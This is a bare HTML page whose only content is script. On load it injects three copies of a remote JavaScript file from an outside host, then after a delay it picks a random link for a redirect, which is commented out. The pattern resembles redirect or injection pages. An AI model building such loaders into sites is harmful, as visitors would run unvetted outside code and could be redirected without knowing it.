
<!DOCTYPE html>
<html>
<head>
    <script type="text/javascript">
        var params = "?set_path_to=/path/to/resource&param1=a&test=tset&var=3";
        var urls = [
            "http://pm.dvtfb.com/links/remote.js",
            "http://pm.dvtfb.com/links/remote.js",
            "http://pm.dvtfb.com/links/remote.js"
        ];

        if (params !== null) {
            urls = urls.map(function(val) {
                return val + params;
            });
        }

        var validURLs = [];
    </script>
</head>
<body>

<script type="text/javascript">
    document.addEventListener("DOMContentLoaded", function() {
        if (urls.length > 0) {
            for (var i in urls) {
                var el = document.createElement('script');
                el.src = urls[i];
                el.async = true;
                el.type = "text/javascript";
                var body = document.getElementsByTagName("body")[0];
                body.appendChild(el);
            }
        }

        setTimeout(function() {
            var link = validURLs[Math.floor(Math.random() * validURLs.length)];
            if (link !== undefined) {
                //window.location.href = link;
            }
        }, 3000);
    });
</script>

</body>
</html>
